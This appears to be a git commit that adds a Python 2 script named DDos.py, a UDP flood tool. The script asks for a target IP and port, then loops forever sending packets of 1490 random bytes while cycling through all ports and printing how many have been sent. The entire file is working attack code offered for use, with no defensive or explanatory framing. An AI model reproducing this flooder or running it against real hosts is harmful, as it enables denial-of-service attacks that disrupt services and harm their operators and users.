a62d286633859f50f027a05961ddbaaf01dcb996
He1Zen <68460974+mishakorzik@users.noreply.github.com>
2021-09-22 22:29:52 +0300

    Create DDos.py

---
+++ DDos.py
@@ -0,0 +1,31 @@
+# modules
+import sys
+import os
+import time
+import socket
+import random
+
+#Times
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+ip = raw_input("While IP Target : ")
+port = input("While Port : ")
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
